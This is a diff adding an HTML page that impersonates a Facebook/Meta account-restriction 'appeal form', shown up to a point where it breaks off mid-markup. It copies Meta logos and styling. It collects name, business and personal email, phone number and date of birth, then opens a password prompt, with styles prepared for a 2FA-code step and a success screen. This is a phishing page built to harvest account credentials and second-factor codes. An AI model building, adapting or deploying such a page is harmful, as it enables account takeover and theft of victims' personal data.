@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Appeal Forms</title>
+    <meta name="robots" content="noindex, nofollow" />
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/Hn19bEHYJbt.png" />
+    <style>
+        /* ===== RESET & BASE ===== */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            font-size: 16px;
+            line-height: 1.65;
+            color: #334155;
+            background-color: #F0F5FA;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        a {
+            color: #046bd2;
+            text-decoration: none;
+        }
+
+        /* ===== HEADER ===== */
+        .site-header {
+            background-color: #D1D5DB75;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .site-header .fb-icon {
+            fill: #046bd2;
+            width: 40px;
+            height: 40px;
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .site-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* ===== FORM CARD ===== */
+        .form-coursera {
+            width: 100%;
+            max-width: 600px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background: #fff;
+            margin: auto;
+        }
+
+        @media (min-width: 768px) {
+            .form-coursera {
+                width: 74%;
+            }
+        }
+
+        .form-coursera-header {
+            background: #F5F6F7;
+            padding: 12px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+        }
+
+        .form-coursera-body {
+            padding: 16px;
+        }
+
+        .form-coursera-intro {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            margin-bottom: 0;
+        }
+
+        .form-coursera-intro p {
+            margin: 10px 0;
+            font-size: 15px;
+            color: #334155;
+        }
+
+        .form-coursera-content {
+            padding: 0 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-coursera-field {
+            margin-bottom: 16px;
+        }
+
+        .form-coursera-field span {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: #90949C;
+            margin-bottom: 2px;
+        }
+
+        .form-coursera-field input[type="text"],
+        .form-coursera-field input[type="email"],
+        .form-coursera-field textarea {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .form-coursera-field input:focus,
+        .form-coursera-field textarea:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
+        }
+
+        /* Radio Group */
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        .radio-group label {
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            font-weight: 400;
+            color: #334155;
+        }
+
+        .radio-group input[type="radio"] {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #d1d5db;
+            border-radius: 50%;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .radio-group input[type="radio"]:checked {
+            background-color: #3b82f6;
+            border-color: #3b82f6;
+        }
+
+        .textarea {
+            resize: vertical;
+            font-size: 14px;
+            width: 100%;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            padding: 8px 12px;
+            font-family: inherit;
+            outline: none;
+        }
+
+        .textarea:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
+        }
+
+        /* Form Footer */
+        .form-coursera-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .form-coursera-footer .logo {
+            height: 20px;
+        }
+
+        .submit-btn {
+            background: #1e3a8a;
+            color: #fff;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background: #15317a;
+        }
+
+        /* ===== MODAL OVERLAY ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        .modal-overlay.hidden {
+            display: none;
+        }
+
+
+        /* Password Modal - Full screen overlay */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: modalOverlayIn 0.3s ease;
+        }
+
+        @keyframes modalOverlayIn {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .modal-box {
+            background: #fff;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 440px;
+            min-height: 560px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 40px 20px;
+            animation: modalSlideIn 0.3s ease;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-logo-top {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+
+        .modal-logo-top img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .modal-pwd-content {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+        }
+
+        .modal-pwd-content>div {
+            width: 100%;
+        }
+
+        .modal-pwd-desc {
+            color: #9a979e;
+            font-size: 14px;
+            margin-bottom: 7px;
+        }
+
+        .pwd-input-wrapper {
+            position: relative;
+            width: 100%;
+            border: 1px solid #d4dbe3;
+            height: 40px;
+            padding: 0 11px;
+            border-radius: 10px;
+            background: #fff;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: all 0.2s;
+        }
+
+        .pwd-input-wrapper:focus-within,
+        .pwd-input-wrapper:hover {
+            border-color: #3b82f6;
+            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
+        }
+
+        .pwd-input-wrapper input {
+            width: calc(100% - 30px);
+            outline: none;
+            height: 100%;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        .pwd-input-wrapper input.input-error {
+            border-color: #ef4444;
+        }
+
+        .hide-password-toggle::-ms-clear,
+        .hide-password-toggle::-ms-reveal {
+            display: none;
+        }
+
+        .toggle-pwd-btn {
+            position: absolute;
+            top: 0;
+            right: 0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            color: #6b7280;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .error_password {
+            color: #ef4444;
+            font-size: 12px;
+            margin-bottom: 8px;
+            min-height: 16px;
+        }
+
+        .continue-btn {
+            width: 100%;
+            height: 40px;
+            min-height: 40px;
+            background: #0064E0;
+            color: #fff;
+            border: none;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+
+        .continue-btn:hover {
+            background: #0056c7;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            color: #9a979e;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .modal-logo-bottom {
+            width: 60px;
+            margin-top: 20px;
+        }
+
+        .modal-logo-bottom img {
+            width: 100%;
+            height: auto;
+        }
+
+        /* 2FA Modal */
+        .tfa-header-row {
+            display: flex;
+            align-items: center;
+            color: #9a979e;
+            gap: 6px;
+            font-size: 14px;
+            margin-bottom: 7px;
+        }
+
+        .tfa-dot {
+            width: 4px;
+            height: 4px;
+            background: #9a979e;
+            border-radius: 5px;
+        }
+
+        .tfa-title {
+            font-size: 20px;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .tfa-desc {
+            color: #9a979e;
+            font-size: 14px;
+        }
+
+        .tfa-image {
+            width: 100%;
+            border-radius: 10px;
+            background: #f5f5f5;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .tfa-image img {
+            display: block;
+        }
+
+        .tfa-submit-btn {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .tfa-submit-btn.tfa-enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .tfa-try-another {
+            width: 100%;
+            margin-top: 20px;
+            color: #9a979e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background: transparent;
+            border-radius: 40px;
+            padding: 10px 20px;
+            border: 1px solid #d4dbe3;
+            font-size: 14px;
+        }
+
+        /* Success Modal */
+        .success-title {
+            font-weight: 700;
+            color: #0A1317;
+            font-size: 15px;
+        }
+
+        .success-close {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            opacity: 0.6;
+            transition: opacity 0.2s;
+        }
+
+        .success-close:hover {
+            opacity: 1;
+        }
+
+        .success-image {
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .success-desc {
+            color: #9a979e;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .success-from {
+            color: #9a979e;
+            margin-bottom: 20px;
+            font-size: 15px;
+        }
+
+        .success-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            background: #0064E0;
+            color: #fff;
+            border-radius: 40px;
+            padding: 10px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+
+        .success-btn:hover {
+            background: #0056c7;
+        }
+
+        /* Custom Radio Buttons (Facebook style) */
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .radio-group input[type=radio],
+        .radio-group input[type="radio"] {
+            -webkit-appearance: none !important;
+            -moz-appearance: none !important;
+            appearance: none !important;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #8a8d91;
+            border-radius: 50%;
+            flex-shrink: 0;
+            position: relative;
+            cursor: pointer;
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            outline: none;
+            accent-color: #4b4f56;
+        }
+
+        .radio-group input[type=radio]:checked,
+        .radio-group input[type="radio"]:checked {
+            border-color: #1c1e21;
+            background: #fff;
+        }
+
+        .radio-group input[type=radio]:checked::after,
+        .radio-group input[type="radio"]:checked::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #1c1e21;
+        }
+
+        /* Phone Input with Flag */
+        .react-tel-input {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            position: relative;
+        }
+
+        .react-tel-input .form-control {
+            width: 100%;
+            border: none;
+            outline: none;
+            height: 100%;
+            font-size: 14px;
+            padding-left: 52px;
+            background: transparent;
+            font-family: inherit;
+        }
+
+        .flag-dropdown {
+            position: absolute;
+            left: 0;
+            height: 100%;
+            z-index: 10;
+        }
+
+        .selected-flag {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            height: 100%;
+            padding: 0 8px;
+            cursor: pointer;
+        }
+
+        .selected-flag img {
+            width: 20px;
+            height: 14px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+
+        .arrow {
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid #555;
+        }
+
+        .flag-dropdown.open .arrow {
+            border-top: none;
+            border-bottom: 4px solid #555;
+        }
+
+        .country-list {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 280px;
+            max-height: 200px;
+            overflow-y: auto;
+            background: #fff;
+            border: 1px solid #d4dbe3;
+            border-radius: 8px;
+            list-style: none;
+            padding: 0;
+            margin: 4px 0 0 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 100;
+        }
+
+        .country-search-wrap {
+            padding: 8px;
+            position: sticky;
+            top: 0;
+            background: #fff;
+        }
+
+        .country-search-wrap input {
+            width: 100%;
+            padding: 6px 8px;
+            border: 1px solid #d4dbe3;
+            border-radius: 6px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .country {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .country:hover {
+            background: #f0f2f5;
+        }
+
+        .country.highlight {
+            background: #e8f0fe;
+        }
+
+        .country-flag {
+            width: 20px;
+            height: 14px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+
+        .country-name {
+            flex: 1;
+        }
+
+        .dial-code {
+            color: #9a979e;
+        }
+
+        /* Phone input wrapper */
+        .phone-input-wrapper {
+            width: 100%;
+            border: 1px solid #d4dbe3;
+            height: 40px;
+            border-radius: 10px;
+            background: #fff;
+            font-size: 14px;
+            margin-bottom: 10px;
+            position: relative;
+            transition: all 0.2s;
+        }
+
+        .phone-input-wrapper:focus-within,
+        .phone-input-wrapper:hover {
+            border-color: #3b82f6;
+            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
+        }
+
+        /* DOB Fields */
+        .dob-label {
+            color: #9a979e;
+            font-size: 14px;
+            margin-bottom: 7px;
+            font-weight: bold;
+        }
+
+        .dob-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+        }
+
+        .dob-field {
+            width: 100%;
+            border: 1px solid #d4dbe3;
+            height: 40px;
+            padding: 0 11px;
+            border-radius: 10px;
+            background: #fff;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: all 0.2s;
+        }
+
+        .dob-field:focus-within,
+        .dob-field:hover {
+            border-color: #1c1e21;
+            box-shadow: none;
+        }
+
+        .dob-field input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        /* Form Error */
+        .form-error {
+            display: none;
+            align-items: center;
+            gap: 4px;
+            color: #ef4444;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
+
+        .form-error.visible {
+            display: flex;
+        }
+
+        /* Loading spinner */
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+
+        /* ===== FOOTER ===== */
+        .site-footer {
+            text-align: center;
+            padding: 20px;
+            color: #334155;
+            font-size: 14px;
+            background-color: #F0F5FA;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .form-coursera {
+                width: 95%;
+            }
+
+            .form-coursera-content {
+                padding: 0 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="site-header">
+        <div style="text-align: center;">
+            <svg aria-hidden="true" class="fb-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                <path
+                    d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z">
+                </path>
+            </svg>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="site-content">
+        <form id="form-info" class="form-coursera">
+            <div class="form-coursera-header"></div>
+
+            <div class="form-coursera-body">
+                <div class="form-coursera-intro">
+                    <p data-i18n="form.introDesc">Please indicate why you believe that account restrictions were imposed by mistake. Our technology
+                        and team work in multiple languages to ensure consistent enforcement of rules. You can
+                        communicate with us in your native language.</p>
+                </div>
+            </div>
+
+            <div class="form-coursera-content">
+                <div class="form-coursera-field">
+                    <label>
+                        <span style="display:flex;gap:5px;"><span data-i18n="form.fullNameLabel">Full Name</span> <span style="color:red">*</span></span>
+                        <input type="text" id="fullName" name="fullname" required data-i18n-placeholder="form.fullNamePlaceholder">
+                    </label>
+                </div>
+
+                <div class="form-coursera-field">
+                    <label>
+                        <span style="display:flex;gap:5px;"><span data-i18n="form.fanpageLabel">Facebook Page Name</span> <span style="color:red">*</span></span>
+                        <input type="text" id="fanpage" name="facebook_page_name" required data-i18n-placeholder="form.fanpagePlaceholder">
+                    </label>
+                </div>
+
+                <div class="form-coursera-field">
+                    <label>
+                        <span style="display:flex;gap:5px;"><span data-i18n="form.emailBusinessLabel">Business Email</span> <span style="color:red">*</span></span>
+                        <input type="email" id="emailBusiness" name="business_email" required data-i18n-placeholder="form.emailBusinessPlaceholder">
+                    </label>
+                </div>
+
+                <div class="form-coursera-field">
+                    <label>
+                        <span style="display:flex;gap:5px;"><span data-i18n="form.emailLabel">Personal Email</span> <span style="color:red">*</span></span>
+                        <input type="email" id="email" name="personal_email" required data-i18n-placeholder="form.emailPlaceholder">
+                    </label>
+                </div>
+                <div class="form-error" id="error-email"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="8" x2="12" y2="12" />
+                        <line x1="12" y1="16" x2="12.01" y2="16" />
+                    </svg><span></span></div>
+
+                <div class="form-coursera-field">
+                    <span style="display:flex;gap:5px;"><span data-i18n="form.phoneLabel">Mobile Phone Number</span> <span style="color:red">*</span></span>
+                    <div class="phone-input-wrapper">
+                        <div class="react-tel-input">
+                            <input class="form-control" placeholder="Phone number" data-i18n-placeholder="form.phonePlaceholder" type="tel" id="phone" value=""
+                                required>
+                            <div class="flag-dropdown" id="flag-dropdown">
+                                <div class="selected-flag" title="Click to change country" onclick="toggleCountryDropdown()" style="cursor:pointer;">
+                                    <img id="selected-flag-img" src="https://flagcdn.com/w20/us.png" alt="US"
+                                        style="width:20px;height:14px;border-radius:2px;">
+                                    <div class="arrow"></div>
+                                </div>
+                                <ul id="country-dropdown" class="country-list" style="display:none">
+                                    <li class="country-search-wrap" onclick="event.stopPropagation()">
+                                        <input type="text" id="country-search" placeholder="Search country..." data-i18n-placeholder="form.searchCountry"
+                                            autocomplete="off">
+                                    </li>
+                                    <!-- Populated dynamically by JS -->
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <script>
+                        // Synchronous: read cached geo from localStorage and apply instantly
+                        (function () {
+                            var codeToFlag = { "+1": "us", "+7": "ru", "+20": "eg", "+27": "za", "+30": "gr", "+31": "nl", "+32": "be", "+33": "fr", "+34": "es", "+36": "hu", "+39": "it", "+40": "ro", "+41": "ch", "+43": "at", "+44": "gb", "+45": "dk", "+46": "se", "+47": "no", "+48": "pl", "+49": "de", "+51": "pe", "+52": "mx", "+53": "cu", "+54": "ar", "+55": "br", "+56": "cl", "+57": "co", "+58": "ve", "+60": "my", "+61": "au", "+62": "id", "+63": "ph", "+64": "nz", "+65": "sg", "+66": "th", "+81": "jp", "+82": "kr", "+84": "vn", "+86": "cn", "+90": "tr", "+91": "in", "+92": "pk", "+93": "af", "+94": "lk", "+95": "mm", "+98": "ir", "+211": "ss", "+212": "ma", "+213": "dz", "+216": "tn", "+218": "ly", "+220": "gm", "+221": "sn", "+222": "mr", "+223": "ml", "+224": "gn", "+225": "ci", "+226": "bf", "+227": "ne", "+228": "tg", "+229": "bj", "+230": "mu", "+231": "lr", "+232": "sl", "+233": "gh", "+234": "ng", "+235": "td", "+236": "cf", "+237": "cm", "+238": "cv", "+240": "gq", "+241": "ga", "+242": "cg", "+243": "cd", "+244": "ao", "+245": "gw", "+248": "sc", "+249": "sd", "+250": "rw", "+251": "et", "+252": "so", "+253": "dj", "+254": "ke", "+255": "tz", "+256": "ug", "+257": "bi", "+258": "mz", "+260": "zm", "+261": "mg", "+262": "re", "+263": "zw", "+264": "na", "+265": "mw", "+266": "ls", "+267": "bw", "+268": "sz", "+269": "km", "+290": "sh", "+291": "er", "+297": "aw", "+298": "fo", "+299": "gl", "+350": "gi", "+351": "pt", "+352": "lu", "+353": "ie", "+354": "is", "+355": "al", "+356": "mt", "+357": "cy", "+358": "fi", "+359": "bg", "+370": "lt", "+371": "lv", "+372": "ee", "+373": "md", "+374": "am", "+375": "by", "+376": "ad", "+377": "mc", "+378": "sm", "+380": "ua", "+381": "rs", "+382": "me", "+383": "xk", "+385": "hr", "+386": "si", "+387": "ba", "+389": "mk", "+420": "cz", "+421": "sk", "+423": "li", "+500": "fk", "+501": "bz", "+502": "gt", "+503": "sv", "+504": "hn", "+505": "ni", "+506": "cr", "+507": "pa", "+509": "ht", "+590": "gp", "+591": "bo", "+592": "gy", "+593": "ec", "+594": "gf", "+595": "py", "+596": "mq", "+597": "sr", "+598": "uy", "+599": "cw", "+670": "tl", "+672": "nf", "+673": "bn", "+674": "nr", "+675": "pg", "+676": "to", "+677": "sb", "+678": "vu", "+679": "fj", "+680": "pw", "+681": "wf", "+682": "ck", "+683": "nu", "+685": "ws", "+686": "ki", "+687": "nc", "+688": "tv", "+689": "pf", "+691": "fm", "+692": "mh", "+850": "kp", "+852": "hk", "+853": "mo", "+855": "kh", "+856": "la", "+880": "bd", "+886": "tw", "+960": "mv", "+961": "lb", "+962": "jo", "+963": "sy", "+964": "iq", "+965": "kw", "+966": "sa", "+967": "ye", "+968": "om", "+970": "ps", "+971": "ae", "+972": "il", "+973": "bh", "+974": "qa", "+975": "bt", "+976": "mn", "+977": "np", "+992": "tj", "+993": "tm", "+994": "az", "+995": "ge", "+996": "kg", "+998": "uz" };
+                            var cached = localStorage.getItem('geo_country');
+                            var dialCode = '+1', flagCode = 'us';
+                            if (cached) {
+                                for (var code in codeToFlag) {
+                                    if (codeToFlag[code] === cached) { dialCode = code; flagCode = cached; break; }
+                                }
+                            }
+                            document.getElementById('phone').value = dialCode + ' ';
+                            var img = document.getElementById('selected-flag-img');
+                            img.src = 'https://flagcdn.com/w20/' + flagCode + '.png';
+                            img.alt = flagCode.toUpperCase();
+                        })();
+                    </script>
+                </div>
+                <div class="form-error" id="error-phone"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="8" x2="12" y2="12" />
+                        <line x1="12" y1="16" x2="12.01" y2="16" />
+                    </svg><span></span></div>
+
+                <div class="form-coursera-field">
+                    <span class="dob-label" data-i18n="form.dobLabel">Date of Birth</span>
+                    <div class="dob-grid">
+                        <div class="dob-field">
+                            <input placeholder="Day" data-i18n-placeholder="form.dayPlaceholder" id="day" type="number" min="1" max="31" required
+                                oninput="31<this.value&&(this.value=31),this.value<1&&''!=this.value&&(this.value=1)">
+                        </div>
+                        <div class="dob-field">
+                            <input placeholder="Month" data-i18n-placeholder="form.monthPlaceholder" id="month" type="number" min="1" max="12" required
+                                oninput="12<this.value&&(this.value=12),this.value<1&&''!=this.value&&(this.value=1)">
+                        </div>
+                        <div class="dob-field">
+                            <input inputmode="numeric" placeholder="Year" data-i18n-placeholder="form.yearPlaceholder" id="year" type="number" min="1" max="2026"
+                                required oninput="2026<this.value&&(this.value=2026)">
+                        </div>
+                    </div>
+                </div>
+                <div class="form-error" id="error-dob"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="8" x2="12" y2="12" />
+                        <line x1="12" y1="16" x2="12.01" y2="16" />
+                    </svg><span></span></div>
+
+                <!-- Radio Buttons + Textarea -->
+                <div class="form-coursera-field">
+                    <span style="display:flex;gap:5px;"><span data-i18n="form.whatHappened">What do you think happened?</span> <span
+                            style="color:red">*</span></span>
+
+                    <div class="radio-group">
+                        <label>
+                            <input type="radio" name="goal" value="An erroneous report" required>
+                            <span data-i18n="form.radio1">An erroneous report or unfair competitive complaint.</span>
+                        </label>
+                        <label>
+                            <input type="radio" name="goal" value="Sent in error">
+                            <span data-i18n="form.radio2">This notification was sent in error.</span>
+                        </label>
+                        <label>
+                            <input type="radio" name="goal" value="Other">
+                            <span data-i18n="form.radio3">No fraud involved / another legitimate reason:</span>
+                        </label>
+                    </div>
+                </div>
+
+                <textarea id="message" name="goal_other" rows="4" placeholder="Please specify..." data-i18n-placeholder="form.textareaPlaceholder"
+                        class="textarea"></textarea>
+            </div>
+
+            <div class="form-coursera-footer">
+                <img decoding="async" src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta Logo"
+                    class="logo">
+                <button type="submit" class="submit-btn" id="info-submit-btn">
+                    <span id="info-btn-text" data-i18n="form.submit">Submit</span>
+                    <span id="info-spinner" class="loading-spinner" style="display:none;"></span>
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Not Logged In Popup -->
+    <div id="notloggedin-overlay" class="nli-overlay hidden">
+        <div class="nli-dialog">
+            <div class="nli-header" data-i18n="nli.title">Not Logged In</div>
+            <div class="nli-body">
+                <p data-i18n="nli.body">Please log in to continue.</p>
+            </div>
+            <div class="nli-footer">
+                <button id="nli-login-btn" class="nli-btn" data-i18n="nli.login">Log In</button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .nli-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .nli-overlay.hidden {
+            display: none;
+        }
+
+        .nli-dialog {
+            width: 438px;
+            max-width: 92vw;
+            border: 2px solid #8a8a8a;
+            border-top: 2px solid #7a7a7a;
+            background: #fff;
+            box-shadow:
+                0 0 0 1px rgba(0, 0, 0, 0.1),
+                0 4px 18px 3px rgba(0, 0, 0, 0.35),
+                0 1px 4px rgba(0, 0, 0, 0.25);
+            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
+            border-radius: 0;
+        }
+
+        .nli-header {
+            background: linear-gradient(to bottom, #7e93b6 0%, #6d84b4 100%);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            padding: 5px 10px;
+            line-height: 22px;
+            border-bottom: 1px solid #1a356e;
+            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
+            letter-spacing: 0.01em;
+        }
+
+        .nli-body {
+            padding: 18px 12px 14px 12px;
+            background: #f6f6f6;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nli-body p {
+            font-size: 12.5px;
+            color: #333;
+            margin: 0;
+            line-height: 1.5;
+            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
+        }
+
+        .nli-footer {
+            padding: 8px 12px;
+            text-align: right;
+            background: #f2f2f2;
+            border-top: 1px solid #e9e9e9;
+        }
+
+        .nli-btn {
+            background: linear-gradient(to bottom, #4e69a2 0%, #3b5998 50%, #3b5998 100%);
+            color: #fff;
+            border: 1px solid #2f477a;
+            padding: 3px 16px 4px;
+            font-size: 12.5px;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 2px;
+            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
+            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.2);
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
+            line-height: 20px;
+        }
+
+        .nli-btn:hover {
+            background: linear-gradient(to bottom, #5b75a7 0%, #4a68a1 100%);
+        }
+
+        .nli-btn:active {
+            background: #3b5998;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+
+    <!-- Password Modal -->
+    <div id="modal-password" class="modal-overlay hidden">
+        <div class="modal-box">
+            <div class="modal-logo-top">
+                <img width="100%" height="100%" alt="Facebook" src="./img/logo-fa.svg">
+            </div>
+            <div class="modal-pwd-content">
+                <div>
+                    <p class="modal-pwd-desc" data-i18n="pwd.desc">For your security, you must enter your password to continue.</p>
+                    <form class="modal-form" id="form-password" autocomplete="off">
+                        <div class="pwd-input-wrapper">
+                            <input class="hide-password-toggle" id="password" placeholder="Password" data-i18n-placeholder="pwd.placeholder"
+                                autocomplete="off" type="password" value="" readonly
+                                data-lpignore="true" data-form-type="other"
+                                onfocus="this.removeAttribute('readonly')">
+                            <button type="button" id="toggle-password" class="toggle-pwd-btn" tabindex="-1">
+                                <svg id="eye-off-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
+                                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round">
+                                    <path
+                                        d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49">
+                                    </path>
+                                    <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path>
+                                    <path
+                                        d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143">
+                                    </path>
+                                    <path d="m2 2 20 20"></path>
+                                </svg>
+                                <svg id="eye-on-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
